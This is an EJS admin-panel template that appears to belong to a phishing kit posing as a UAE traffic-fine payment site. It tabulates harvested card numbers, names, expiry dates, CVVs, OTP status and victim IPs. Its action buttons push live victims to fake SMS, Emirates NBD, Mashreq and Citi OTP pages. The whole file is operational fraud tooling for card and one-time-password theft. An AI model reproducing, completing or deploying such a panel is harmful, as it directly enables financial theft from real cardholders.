<%- include('_layout', { pageTitle: 'Payments', activePage: 'payments', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error">Database error: <%= dbError %></div>
<% } else { %>

<div class="filter-bar">
  <form method="GET" action="/admin/payments" style="display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;width:100%;">
    <div class="form-group" style="flex:1;min-width:200px;">
      <label>Search (plate, card, issuer)</label>
      <input type="text" name="q" value="<%= search %>" placeholder="e.g. JOHN DOE, Emirates NBD...">
    </div>
    <div class="form-group" style="min-width:160px;">
      <label>Status</label>
      <select name="status">
        <option value="">All statuses</option>
        <option value="pending"      <%= statusFilter==='pending'      ? 'selected' : '' %>>Pending</option>
        <option value="approved"     <%= statusFilter==='approved'     ? 'selected' : '' %>>Approved</option>
        <option value="declined"     <%= statusFilter==='declined'     ? 'selected' : '' %>>Declined</option>
        <option value="otp_received" <%= statusFilter==='otp_received' ? 'selected' : '' %>>OTP Received</option>
      </select>
    </div>
    <div style="display:flex;gap:8px;align-items:flex-end;">
      <button type="submit" class="btn btn-primary" style="margin-bottom:1px;">Filter</button>
      <a href="/admin/payments" class="btn btn-ghost" style="margin-bottom:1px;">Clear</a>
    </div>
  </form>
</div>

<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Payments</div>
    <div class="tc-meta"><%= total %> records</div>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr>
        <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
        <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
        <th>Issuer</th><th>Country</th><th>Type</th>
        <th>OTP Page</th><th>Status</th><th>IP</th><th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <% if (payments.length === 0) { %>
    <tr><td colspan="15" style="text-align:center;padding:40px;color:#94a3b8;">No records found.</td></tr>
    <% } %>
    <% payments.forEach(function(p) {
      const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
      const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
    %>
    <tr>
      <td class="muted small"><%= p.id %></td>
      <td class="small nowrap"><%= dt %></td>
      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
      <td class="text-green">AED <%= Number(p.total_fine).toLocaleString() %></td>
      <td class="mono select-all" style="font-size:12px;"><%= p.card_number || '—' %></td>
      <td class="nowrap"><%= p.card_name || '—' %></td>
      <td class="mono"><%= p.expiry || '—' %></td>
      <td class="mono"><%= p.cvv || '—' %></td>
      <td class="small"><%= p.card_issuer || '—' %></td>
      <td class="small"><%= p.card_country || '—' %></td>
      <td class="small"><%= p.card_type || '—' %></td>
      <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
      <td><span class="badge <%= sc %>"><%= p.otp_status %></span></td>
      <td class="mono muted small"><%= p.ip || '—' %></td>
      <td>
        <div class="action-bar">
          <button class="btn btn-sm btn-blue"   title="Redirect to SMS OTP"     onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
          <button class="btn btn-sm btn-purple"  title="Redirect to Emirates NBD" onclick="redirect('<%= p.sid %>','otp')">NBD</button>
          <button class="btn btn-sm btn-amber"   title="Redirect to Mashreq"    onclick="redirect('<%= p.sid %>','otp-mashreq')">MQ</button>
          <button class="btn btn-sm btn-ghost"   title="Redirect to Citi"       onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
          <button class="btn btn-sm btn-primary" title="Mark as approved"       onclick="setStatus('<%= p.sid %>','approved')">Approve</button>
          <button class="btn btn-sm btn-red"     title="Delete record"          onclick="delPayment('<%= p.sid %>')">Delete</button>
        </div>
      </td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>

  <% if (totalPages > 1) { %>
  <div style="padding:14px 20px;display:flex;gap:6px;justify-content:center;border-top:1px solid #f1f5f9;">
    <% for (let i = 1; i <= totalPages; i++) { %>
    <a href="/admin/payments?p=<%= i %>&status=<%= encodeURIComponent(statusFilter) %>&q=<%= encodeURIComponent(search) %>"
       class="btn btn-sm <%= i === page ? 'btn-primary' : 'btn-ghost' %>"><%= i %></a>
    <% } %>
  </div>
  <% } %>
</div>

<% } %>

<script>
function redirect(sid, page) {
  if (!confirm('Redirect user to ' + page + '?\n(User must be active on an OTP page.)')) return;
  adminAction({ act: 'redirect', sid, page });
}
function setStatus(sid, status) {
  if (!confirm('Set status to "' + status + '"?')) return;
  adminAction({ act: 'set_status', sid, status });
}
function delPayment(sid) {
  if (!confirm('Permanently delete this record?')) return;
  adminAction({ act: 'delete_payment', sid });
}
</script>

<%- include('_layout_end') %>
